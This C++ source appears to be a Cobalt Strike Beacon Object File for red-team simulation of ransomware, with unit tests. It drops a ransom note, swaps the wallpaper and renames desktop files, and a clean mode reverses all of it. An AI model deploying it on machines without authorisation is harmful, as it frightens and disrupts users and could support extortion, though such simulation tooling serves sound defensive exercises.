#include <Windows.h>
#include "base\helpers.h"
#include <shlobj_core.h>
#include <shlwapi.h>
#include <objbase.h>
#include <shellapi.h>
#include <stdio.h>
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#include "base\mock.h"
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "Shlwapi.lib")
#pragma comment (lib, "ole32.lib")
#pragma comment (lib, "user32.lib")

#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
	// Define the Dynamic Function Resolution declaration for the GetLastError function
	DFR(KERNEL32, GetLastError);
#define GetLastError KERNEL32$GetLastError 

	DFR(SHELL32, SHGetKnownFolderPath);
#define SHGetKnownFolderPath SHELL32$SHGetKnownFolderPath

	DFR(OLE32, CoTaskMemFree);
#define CoTaskMemFree OLE32$CoTaskMemFree

	DFR(SHELL32, StrStrIW);
#define StrStrIW SHELL32$StrStrIW
	DFR(SHELL32, StrStrIA);
#define StrStrIA SHELL32$StrStrIA

	DFR(SHLWAPI, PathFileExistsW);
#define PathFileExistsW SHLWAPI$PathFileExistsW

	DFR(MSVCRT, memset);
#define memset MSVCRT$memset

	DFR(MSVCRT, memcpy);
#define memcpy MSVCRT$memcpy

	DFR(MSVCRT, wcslen);
#define wcslen MSVCRT$wcslen

	DFR(USER32, SystemParametersInfoW);
#define SystemParametersInfoW USER32$SystemParametersInfoW

	DFR(MSVCRT, _swprintf);
#define _swprintf MSVCRT$_swprintf

	DFR(KERNEL32, CreateFileW);
#define CreateFileW KERNEL32$CreateFileW

	DFR(KERNEL32, ReadFile);
#define ReadFile KERNEL32$ReadFile

	DFR(KERNEL32, DeleteFileW);
#define DeleteFileW KERNEL32$DeleteFileW

	DFR(KERNEL32, WriteFile);
#define WriteFile KERNEL32$WriteFile

	DFR(KERNEL32, GetFileSize);
#define GetFileSize KERNEL32$GetFileSize

	DFR(KERNEL32, CloseHandle);
#define CloseHandle KERNEL32$CloseHandle

	DFR(MSVCRT, malloc);
#define malloc MSVCRT$malloc

	DFR(MSVCRT, free);
#define free MSVCRT$free

	DFR(MSVCRT, strlen);
#define strlen MSVCRT$strlen

	DFR(MSVCRT, sprintf);
#define sprintf MSVCRT$sprintf

	DFR(KERNEL32, FindFirstFileW);
#define FindFirstFileW KERNEL32$FindFirstFileW

	DFR(KERNEL32, FindNextFileW);
#define FindNextFileW KERNEL32$FindNextFileW

	DFR(KERNEL32, GetFileAttributesW);
#define GetFileAttributesW KERNEL32$GetFileAttributesW

	DFR(KERNEL32, MoveFileW);
#define MoveFileW KERNEL32$MoveFileW

	DFR(KERNEL32, FindClose);
#define FindClose KERNEL32$FindClose

	int go(char* args, int len);
}

/// <summary>
/// Method to check if the provided desktop folder path is a user desktop.
/// </summary>
/// <param name="desktopFolder"></param>
/// <returns></returns>
BOOL IsUserDesktop(PWSTR desktopFolder) {

	if (!StrStrIW(desktopFolder, L"\\users\\")) {
		BeaconPrintf(CALLBACK_ERROR, "[!] The path %ls is not a user folder.\n", desktopFolder);
		return FALSE;
	}
	return TRUE;
}

/// <summary>
/// Method to retrieve the current user's desktop folder path.
/// </summary>
/// <param name="outBuffer">output buffer</param>
/// <param name="outBufferLen">size of output buffer</param>
/// <returns></returns>
BOOL GetDesktopFolder(PWSTR outBuffer, SIZE_T outBufferLen) {

	PWSTR desktopFolder = NULL;
	BOOL success = FALSE;
	const GUID FOLDERID_Desktop = { 0xB4BFCC3A, 0xDB2C, 0x424C, 0xB0, 0x29, 0x7F, 0xE9, 0x9A, 0x87, 0xC6, 0x41 };
	// Retrieve the current user's desktop directory
	HRESULT res = SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &desktopFolder);
	if (res == S_OK) {

		// Ensure the directory exists
		if (PathFileExistsW(desktopFolder)) {
			// Make sure the output buffer is large enough
			if (wcslen(desktopFolder) < outBufferLen) {
				// Copy the desktop folder path to the outputBuffer
				memcpy(outBuffer, desktopFolder, wcslen(desktopFolder) * sizeof(WCHAR));
				success = TRUE;
			}
			else {
				BeaconPrintf(CALLBACK_ERROR, "[!] Output buffer is too small for the desktop folder path.\n");
			}
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "[!] Desktop folder does not exist %d\n", GetLastError());
		}
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve desktop folder path %d\n", GetLastError());
	}

	// Free memory
	CoTaskMemFree(desktopFolder);
	return success;
}

/// <summary>
/// Method to write a file to disk
/// </summary>
/// <param name="fileName"></param>
/// <param name="fileBytes"></param>
/// <param name="fileLen"></param>
/// <returns></returns>
BOOL WriteFileToDisk(wchar_t* fileName, char* fileBytes, int fileLen) {
	DWORD dwBytesWritten;

	//Open handle to file
	HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "WriteFiletoDisk: CreateFileW failed! GLE: %d\n", GetLastError());
		return FALSE;
	}

	// Write file to disk 
	if (!WriteFile(hFile, (LPCVOID)fileBytes, (DWORD)fileLen, &dwBytesWritten, NULL)) {
		BeaconPrintf(CALLBACK_ERROR, "WriteFiletoDisk: WriteFile failed! GLE: %d\n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}

	//Close the file handle
	CloseHandle(hFile);
	return TRUE;
}

/// <summary>
/// Method to assemble a path
/// </summary>
/// <param name="deskopPath"></param>
/// <param name="fileName"></param>
/// <param name="outBuffer"></param>
/// <param name="outBufferLen"></param>
/// <returns></returns>
BOOL CreateFilePath(PWSTR deskopPath, PWSTR fileName, PWSTR outBuffer, SIZE_T outBufferLen, PWSTR format = L"%ls\\%ls") {
	// Wipe buffer
	memset(outBuffer, 0, outBufferLen * sizeof(WCHAR));

	//Veirfy buffer is large and then assemble path
	if (wcslen(deskopPath) + wcslen(L"\\") + wcslen(fileName) + 1 < outBufferLen) {
		_swprintf(outBuffer, format, deskopPath, fileName);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[!] Assembled file path: %ls\n", outBuffer);
		return FALSE;
	}

	return TRUE;
}

/// <summary>
/// Method to read the orginal wallpaper path from ransom note
/// </summary>
/// <param name="ransomNotePath"></param>
/// <param name="outBuffer"></param>
/// <param name="outBufferLen"></param>
/// <returns></returns>
BOOL ReadOriginalImagePath(PWSTR ransomNotePath, PWSTR outBuffer, SIZE_T outBufferLen) {
	// Open handle to file
	HANDLE hFile = CreateFileW(ransomNotePath, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "ReadOriginalImagePath: CreateFileW falied! GLE %d\n", GetLastError());
		return FALSE;
	}

	//Get size of file
	DWORD fileSize = GetFileSize(hFile, 0);
	if (fileSize == INVALID_FILE_SIZE) {
		BeaconPrintf(CALLBACK_ERROR, "ReadOrginalImage: GetfileSize failed! GLE: %d\n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}

	//Allocate buffer for file
	char* fileContent = (char*)malloc(fileSize + 1);
	memset(fileContent, 0, fileSize + 1);

	//Read file contents + close handle
	DWORD dwBytesRed;
	BOOL result = ReadFile(hFile, (LPVOID)fileContent, (DWORD)fileSize, &dwBytesRed, NULL);
	CloseHandle(hFile);
	if (!result) {
		BeaconPrintf(CALLBACK_ERROR, "ReadOriginalImagePath: ReadFile failed! GLE: %d\n", GetLastError());
		free(fileContent);
		return FALSE;
	}

	//Try and find 'ORIGINAL WALLPAPER: ' within file
	char* keyword = "ORIGINAL WALLPAPER: ";
	char* keywordLoc = StrStrIA(fileContent, keyword);

	// Make sure we found the keyword
	if (!keywordLoc) {
		BeaconPrintf(CALLBACK_ERROR, "[!] ReadOriginalImagePath: Failed to find the keyword in the ransom note! %d\n", GetLastError());
		memset(fileContent, 0, fileSize);
		free(fileContent);
		return FALSE;
	}

	//Get pointer to actual file path using keywordLoc pointer and lenght of keyword
	char* filePath = keywordLoc + strlen(keyword);

	//Make sure the file path will fit in the output buffer
	if (strlen(filePath) + 1 > outBufferLen) {
		BeaconPrintf(CALLBACK_ERROR, "[!] ReadOriginalImagePath: The output buffer is too small for the original wallpaper path! %d\n", GetLastError());
		memset(fileContent, 0, fileSize);
		free(fileContent);
		return FALSE;
	}

	// Store file path in output buffer as wide char
	_swprintf(outBuffer, L"%S", filePath);

	// Free fileContent buffer
	memset(fileContent, 0, fileSize);
	free(fileContent);

	// Ensure the file exists
	if (!PathFileExistsW(outBuffer)) {
		BeaconPrintf(CALLBACK_ERROR, "[!] ReadOriginalImagePath: The original wallpaper path does not exist: %ls\n", outBuffer);
		return FALSE;
	}

	return TRUE;
}

/// <summary>
/// Method to rename files on the desktop Path
/// </summary>
/// <param name="desktopPath"></param>
/// <param name="ransomMode"></param>
/// <returns></returns>
BOOL RenameFiles(PWSTR desktopPath, BOOL ransom) {
	// Assemble the search path for use with FindFirsFileW
	WCHAR searchPath[MAX_PATH];
	if (!CreateFilePath(desktopPath, L"*", searchPath, MAX_PATH)) {
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to assemble search path %d.\n", GetLastError());
		return FALSE;
	}

	WIN32_FIND_DATAW fileFounded;
	HANDLE hSearch = FindFirstFileW(searchPath, &fileFounded);
	if (hSearch == INVALID_HANDLE_VALUE) {
		BeaconPrintf(CALLBACK_ERROR, "[!] FindFirstFileW failed! GLE: %d\n", GetLastError());
		return FALSE;
	}

	// Iterate through files in the desktop directory
	WCHAR currPath[MAX_PATH];
	WCHAR newPath[MAX_PATH];
	int numFilesAltered = 0;
	do {
		// Assemble full path of file
		if (!CreateFilePath(desktopPath, fileFounded.cFileName, currPath, MAX_PATH))
			continue;

		// Excluede files that are not regular files
		if (StrStrIW(currPath, L".ransomnote.txt") || StrStrIW(currPath, L"RANSOM.txt") || StrStrIW(currPath, L"desktop.ini"))
			continue;

		// Make sure it's a file and not a directory
		DWORD dwAttrib = GetFileAttributesW(currPath);
		if (dwAttrib == INVALID_FILE_ATTRIBUTES || dwAttrib & FILE_ATTRIBUTE_DIRECTORY)
			continue;

		// If ransom mode is enabled, rename to add 'RANSOM.' to the beginning of the file name
		if (ransom) {

			// Assemble new path
			if (!CreateFilePath(desktopPath, fileFounded.cFileName, newPath, MAX_PATH, L"%ls\\RANSOM.%ls"))
				continue;

			// Rename the file
			if (MoveFileW(currPath, newPath))
				numFilesAltered++;
		}
		else {
			wchar_t* originalName = StrStrIW(fileFounded.cFileName, L"RANSOM.");
			if (originalName) {
				// Increment pinter by lenght of keyword to get original file name
				originalName += wcslen(L"RANSOM.");

				// Assemble new path
				if (!CreateFilePath(desktopPath, originalName, newPath, MAX_PATH))
					continue;

				// Rename the file
				if(MoveFileW(currPath, newPath))
					numFilesAltered++;
			}
		}

	} while (FindNextFileW(hSearch, &fileFounded));


	// Store the last error before close the search handle
	DWORD dwLastError = GetLastError();

	// Close the search handle
	FindClose(hSearch);

	// Return the number of files altered
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully altered %d files.\n", numFilesAltered);

	// Evalute the last error from FindNextFileW
	if (dwLastError != ERROR_NO_MORE_FILES) {
		BeaconPrintf(CALLBACK_ERROR, "[!] RenameFiles: FindNextFileW failed! GLE: %d\n", dwLastError);
		return FALSE;
	}

	return TRUE;
}

/// <summary>
/// Method to drop ransom note and set new wallpaper to simulate ransomware behavior
/// </summary>
/// <returns></returns>
int Ransom(WCHAR desktopPath[], char* newWallpaperBytes, int newWallpaperLen, char* noteContentBytes, int noteContentLen) {

	// Retrieve and save the original wallpaper path
	WCHAR orginalWallpaperPath[MAX_PATH];
	memset(orginalWallpaperPath, 0, MAX_PATH * sizeof(WCHAR));

	if (SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, orginalWallpaperPath, 0)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] The original wallpaper is: %ls\n", orginalWallpaperPath);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve the original wallpaper: %d\n", GetLastError());
		return -1;
	}

	// Check to see if the wallpaper is already the ransom wallpaper
	if (StrStrIW(orginalWallpaperPath, L"ransoned.png")) {
		BeaconPrintf(CALLBACK_ERROR, "[!] The wallpaper is already the ransom wallpaper.\n");
		return -1;
	}

	//ToDo: Handle the Transcodewallpaper

	// Create the new wallpaper file path
	WCHAR newWallpaperPath[MAX_PATH];
	if (!CreateFilePath(desktopPath, L"ransoned.png", newWallpaperPath, MAX_PATH))
		return -1;

	// Assemble file path to write ransom note to 
	WCHAR ransomNotePath[MAX_PATH];
	if (!CreateFilePath(desktopPath, L"RANSOM.txt", ransomNotePath, MAX_PATH))
		return -1;

	// Create buffer large enough to hold the noteContent string 'original wallpaper: ' and the orginalWallpaperPath
	size_t reqSize = (size_t)noteContentLen + strlen("ORIGINAL WALLPAPER: ") + wcslen(orginalWallpaperPath) + 1;  // +1 for null-terminator byte
	char* ransomNoteContent = (char*)malloc(reqSize);
	memset(ransomNoteContent, 0, reqSize);

	//Create contents of ransom note
	sprintf(ransomNoteContent, "%s\nORIGINAL WALLPAPER: %ls", noteContentBytes, orginalWallpaperPath);

	//Write ransom file to disk
	BOOL result = WriteFileToDisk(ransomNotePath, ransomNoteContent, (int)strlen(ransomNoteContent));

	//Wipe and free allocated buffer
	memset(ransomNoteContent, 0, reqSize);
	free(ransomNoteContent);

	if (result)
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote RANSOM.txt to disk\n");
	else
		return -1;


	//Write new wallpaper to disk
	if (WriteFileToDisk(newWallpaperPath, newWallpaperBytes, newWallpaperLen)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Ransom: Successfully wrote the new wallpaper to disk.\n");
	}
	else {
		if (!DeleteFileW(ransomNotePath))
			BeaconPrintf(CALLBACK_OUTPUT, "[!] Ransom: DeleteFileW falied for %ls\n!", ransomNotePath);
		return -1;
	}

	// Set the new wallpaper
	if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, newWallpaperPath, SPIF_UPDATEINIFILE)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Ransom: Successfully set the new wallpaper.\n");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] Ransom: Failed to set the new wallpaper: %d\n", GetLastError());
		if (!DeleteFileW(ransomNotePath))
			BeaconPrintf(CALLBACK_OUTPUT, "[!] Ransom: DeleteFileW falied for %ls\n!", ransomNotePath);
		if (!DeleteFileW(newWallpaperPath))
			BeaconPrintf(CALLBACK_OUTPUT, "[!] Ransom: DeleteFileW falied for %ls\n!", newWallpaperPath);
		return -1;
	}

	// Rename files on the desktop to simulate encryption
	if(RenameFiles(desktopPath, TRUE))
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully renamed files on the desktop.\n");
	else
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to rename files on the desktop.\n");

	return 0;
}

/// <summary>
/// Method to clean up the ransom note and restore the original wallpaper
/// </summary>
/// <param name="desktopPath"></param>
/// <returns></returns>
int Clean(WCHAR desktopPath[]) {
	// Assemble ransom note file path
	WCHAR ransomNotePath[MAX_PATH];
	if (!CreateFilePath(desktopPath, L"RANSOM.txt", ransomNotePath, MAX_PATH))
		return -1;

	// Assemble dropped image path
	WCHAR ransomWallpaper[MAX_PATH];
	if (!CreateFilePath(desktopPath, L"ransoned.png", ransomWallpaper, MAX_PATH))
		return -1;

	// Retrieve the original wallpaper path from the ransom note
	WCHAR originalWallpaperPath[MAX_PATH];
	memset(originalWallpaperPath, 0, MAX_PATH * sizeof(WCHAR));
	if (!ReadOriginalImagePath(ransomNotePath, originalWallpaperPath, MAX_PATH))
		return -1;

	// Restore the original wallpaper
	if (SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, originalWallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Clean: Successfully restored the original wallpaper.\n");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] Clean: Failed to restore the original wallpaper: %d\n", GetLastError());
		return -1;
	}

	// Rename files to original names
	if (RenameFiles(desktopPath, FALSE))
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully renamed files.\n");
	else
		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to rename files.\n");

	//Delete the ransom wallpaper
	if (!DeleteFileW(ransomWallpaper))
		BeaconPrintf(CALLBACK_ERROR, "[!] Clean: falied to delete the ransom wallpaper for %d\n!", GetLastError());
	else
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Clean: Successfully deleted the ransom wallpaper.\n");

	//Delete the ransom note
	if (!DeleteFileW(ransomNotePath))
		BeaconPrintf(CALLBACK_ERROR, "[!] Clean: Falied to delete the ransom note for %d\n!", GetLastError());
	else
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Clean: Successfully deleted the ransom note.\n");


	return 0;
}

/// <summary>
/// entrypoint for the BOF
/// </summary>
/// <param name="args"></param>
/// <param name="len"></param>
/// <returns></returns>
int go(char* args, int len) {

	WCHAR desktopPath[MAX_PATH];
	memset(desktopPath, 0, MAX_PATH * sizeof(WCHAR));

	if (GetDesktopFolder(desktopPath, sizeof(desktopPath))) {

		if (IsUserDesktop(desktopPath))
			BeaconPrintf(CALLBACK_OUTPUT, "[+] The desktop path: %ls.\n", desktopPath);
		else
			return -1;
	}
	else
		return -1;

	// BOF Data Parse to retrieve the mode string
	datap parser;
	BeaconDataParse(&parser, args, len);
	wchar_t* mode = (wchar_t*)BeaconDataExtract(&parser, NULL);

	// Compare the mode
	if (StrStrIW(mode, L"ransom")) {
		// BOF Data Parse to retrieve the wallpaper bytes and length
		int wallpaperLen = 0;
		int noteContentLen = 0;
		char* WallpaperBytes = BeaconDataExtract(&parser, &wallpaperLen);
		char* noteContent = BeaconDataExtract(&parser, &noteContentLen);
		return Ransom(desktopPath, WallpaperBytes, wallpaperLen, noteContent, noteContentLen);

	}
	else if (StrStrIW(mode, L"clean")) {
		return Clean(desktopPath);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "[!] Invalid mode provided: %ls\n", mode);
		return -1;
	}

	return 0;
}


#if defined(_DEBUG)
/// <summary>
/// Method to load a file into memory for debug purposes
/// </summary>
/// <param name="Path"></param>
/// <returns></returns>
const std::vector<char> LoadFileIntoMemory(LPSTR Path) {
	DWORD fileSize = 0;
	DWORD dwBytesRead = 0;

	HANDLE hFile = CreateFileA(Path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Error opening %s\r\n", Path);
		return std::vector<char>();
	}

	fileSize = GetFileSize(hFile, 0);
	const std::vector<char> ImageBuffer(fileSize + 1);
	ReadFile(hFile, (LPVOID)ImageBuffer.data(), (DWORD)ImageBuffer.size(), &dwBytesRead, 0);

	CloseHandle(hFile);

	return ImageBuffer;
}
#endif


// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {

	const std::vector<char> imageBuffer = LoadFileIntoMemory("C:\\Users\\gabri\\OneDrive\\Desktop\\course\\ransoned.png");	    // <-- Insert the path of image that u want set as ransom backgorund
	const std::vector<char> noteBuffer = LoadFileIntoMemory("C:\\Users\\gabri\\OneDrive\\Desktop\\course\\customnote.txt");       // <-- Insert the path of custon note that u want wrtite as ransom note
	if (imageBuffer.empty() || noteBuffer.empty()) {
		printf("Failed to read in file");
		return -1;
	}
	// Run BOF's entrypoint
	// To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
	bof::runMocked<const wchar_t*, const std::vector<char>&>(go, L"clean", imageBuffer, noteBuffer);
	return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest/gtest.h>
#include <lmcons.h>
// Declare the username from 'whomai' here
const char* USERNAME = "gabri";

// Delcare paths for ransom wallpaper and custom ransome not for use in unit testing
wchar_t* desktopPath = L"C:\\Users\\gabri\\OneDrive\\Desktop";							 // <-- Insert the path of your desktop
char* imageFilePath = "C:\\Users\\gabri\\OneDrive\\Desktop\\course\\ransoned.png";		// <-- Insert the path of png that u want wrtite as ransom note
char* noteFilePath = "C:\\Users\\gabri\\OneDrive\\Desktop\\course\\customnote.txt";		// <-- Insert the path of custon note that u want wrtite as ransom note

BOOL IsNormalUser() {
	CHAR username[UNLEN + 1] = { 0 };
	DWORD usernameLen = UNLEN + 1;

	GetUserNameA(username, &usernameLen);

	if (StrStrIA(username, USERNAME))
		return TRUE;
	else
		return FALSE;
}

void PopulateStrcture(SHELLEXECUTEINFOA* structure, char* parameters) {
	structure->cbSize = sizeof(SHELLEXECUTEINFOA);
	structure->fMask = SEE_MASK_NOCLOSEPROCESS;
	structure->lpVerb = "runas";
	structure->lpFile = "C:\\Users\\gabri\\OneDrive\\Desktop\\sysinternals\\psexec64.exe";
	structure->lpParameters = parameters;
	structure->nShow = SW_SHOWNORMAL;
}

TEST(Ransomware, RunasOthers) {
	CHAR exePath[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	char* userCommands[3] = {
		"-u \"nt authority\\network service\"",
		"-u \"nt authority\\local service\"",
		"-s"
	};
	SHELLEXECUTEINFOA procInfo = { 0 };
	CHAR arguments[255] = { 0 };

	for (int i = 0; i < sizeof(userCommands) / sizeof(char*); i++) {
		memset(arguments, 0, 255);
		memset(&procInfo, 0, sizeof(SHELLEXECUTEINFOA));

		sprintf_s(arguments, "/accepteula -i %s %s --gtest_filter=Ransomware.goTest::Ransomware.SleepTest", userCommands[i], exePath);

		PopulateStrcture(&procInfo, arguments);

		ShellExecuteExA(&procInfo);

		WaitForSingleObject(procInfo.hProcess, INFINITE);
	}
}

TEST(Ransomware, IsUserDesktopTest) {
	EXPECT_TRUE(IsUserDesktop(L"C:\\Users\\testuser\\Desktop"));

	EXPECT_FALSE(IsUserDesktop(L"C:\\Windows\\ServiceProfiles\\LocalService\\Desktop"));

	WCHAR desktopPath[MAX_PATH] = { 0 };
	EXPECT_FALSE(IsUserDesktop(desktopPath));
}

TEST(Ransomware, GetDesktopFolderTest) {
	WCHAR bigBuf[MAX_PATH] = { 0 };
	EXPECT_TRUE(GetDesktopFolder(bigBuf, MAX_PATH));
	printf("Desltop Folder: %ls\n", bigBuf);

	WCHAR smallBuf[10] = { 0 };
	EXPECT_FALSE(GetDesktopFolder(smallBuf, 10));
}

TEST(Ransomware, CreateFilePathTest) {
	WCHAR bigBuff[MAX_PATH] = { 0 };
	EXPECT_TRUE(CreateFilePath(desktopPath, L"RANSOM.txt", bigBuff, MAX_PATH));

	WCHAR smallBuff[10] = { 0 };
	EXPECT_FALSE(CreateFilePath(desktopPath, L"RANSOM.txt", smallBuff, 10));
}

TEST(Ransomware, WriteFileToDiskTest) {

	// Assemble first file path to write
	WCHAR filePath[MAX_PATH] = { 0 };
	_swprintf(filePath, L"%ls\\RANSOM.txt", desktopPath);

	// Assemble second file path to write
	WCHAR filePath2[MAX_PATH] = { 0 };
	_swprintf(filePath2, L"%ls\\RANSOM2.txt", desktopPath);

	// Load ransom note into memery
	const std::vector<char> noteBuffer = LoadFileIntoMemory(noteFilePath);

	// Retrieve the current wallpaper file path
	WCHAR currWallpaper[MAX_PATH];
	memset(currWallpaper, 0, MAX_PATH * sizeof(WCHAR));
	if (!SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, currWallpaper, 0))
		FAIL();

	// Create buffer to hold ransom note + original wallpaper path
	size_t reqSize = strlen(noteBuffer.data()) + wcslen(currWallpaper) + strlen("\nORIGINAL WALLPAPER: ") + 1;  // +1 for null-terminator byte
	char* buffer = (char*)malloc(reqSize);
	memset(buffer, 0, reqSize);

	// Assemble note
	sprintf(buffer, "%s\nORIGINAL WALLPAPER: %ls", noteBuffer.data(), currWallpaper);

	// Expect true writing first ransom note that includes original wallpaper path
	EXPECT_TRUE(WriteFileToDisk(filePath, buffer, (int)strlen(buffer)));
	free(buffer);

	// Expect true writing first ransom note that includes original wallpaper path
	EXPECT_TRUE(WriteFileToDisk(filePath2, (char*)noteBuffer.data(), (int)noteBuffer.size()));

	// Expect false with invalid path location and/or NULL buffer
	EXPECT_FALSE(WriteFileToDisk(L"C:\\trash\\nonexistspath.txt", (char*)noteBuffer.data(), (int)noteBuffer.size()));
}


TEST(Ransomware, ReadOriginalImagePathTest) {

	// Assemble first file path to write
	WCHAR filePath[MAX_PATH] = { 0 };
	_swprintf(filePath, L"%ls\\RANSOM.txt", desktopPath);

	// Assemble second file path to write
	WCHAR filePath2[MAX_PATH] = { 0 };
	_swprintf(filePath2, L"%ls\\RANSOM2.txt", desktopPath);


	// Normal test expect TRUE
	WCHAR originalWallpaperPath[MAX_PATH] = { 0 };
	EXPECT_TRUE(ReadOriginalImagePath(filePath, originalWallpaperPath, MAX_PATH));

	// Expect FLASE due to note not contianing original wallpaper path
	memset(originalWallpaperPath, 0, MAX_PATH * sizeof(WCHAR));
	EXPECT_FALSE(ReadOriginalImagePath(filePath2, originalWallpaperPath, MAX_PATH));

	// Expect FLASE due to invalid path
	memset(originalWallpaperPath, 0, MAX_PATH * sizeof(WCHAR));
	EXPECT_FALSE(ReadOriginalImagePath(L"C:\\trash\\nonexistspath.txt", originalWallpaperPath, MAX_PATH));

	// Expect FLASE due to small buffer
	WCHAR smallBuff[10] = { 0 };
	EXPECT_FALSE(ReadOriginalImagePath(filePath, smallBuff, 10));

	//Delete files
	DeleteFileW(filePath);
	DeleteFileW(filePath2);
}

TEST(Ransomware, RansomTets) {
	//Load arguments into memory
	const std::vector<char> imageBuffer = LoadFileIntoMemory(imageFilePath);
	const std::vector<char> noteBuffer = LoadFileIntoMemory(noteFilePath);

	// Expect success
	EXPECT_EQ(0, Ransom(desktopPath, (char*)imageBuffer.data(), imageBuffer.size(), (char*)noteBuffer.data(), noteBuffer.size()));

	// Expect fail due to system already being ransomed
	EXPECT_NE(0, Ransom(desktopPath, (char*)imageBuffer.data(), imageBuffer.size(), (char*)noteBuffer.data(), noteBuffer.size()));

}

TEST(Ransomware, CleanTest) {
	// Expect success
	EXPECT_EQ(0, Clean(desktopPath));

	// Expect fail due to system already being cleaned
	EXPECT_NE(0, Clean(desktopPath));
}

TEST(Ransomware, goTest) {
	// Load arguments into memorya
	const std::vector<char> imageBuffer = LoadFileIntoMemory(imageFilePath);
	const std::vector<char> noteBuffer = LoadFileIntoMemory(noteFilePath);

	// Run ransom mode
	bof::output::RuturnData results = bof::runMocked<const wchar_t*, const std::vector<char>&>(go, L"ransom", imageBuffer, noteBuffer);

	// Expect success if run as normal user otherwise expect fail
	if (IsNormalUser())
		EXPECT_EQ(0, results.returnVal);
	else
		EXPECT_NE(0, results.returnVal);

	// Run clean mode
	results = bof::runMocked<const wchar_t*>(go, L"clean");

	// Expect success if run as normal user otherwise expect fail
	if (IsNormalUser())
		EXPECT_EQ(0, results.returnVal);
	else
		EXPECT_NE(0, results.returnVal);
}

TEST(Ransomware, SleepTest) {
	Sleep(5000);
}

#endif
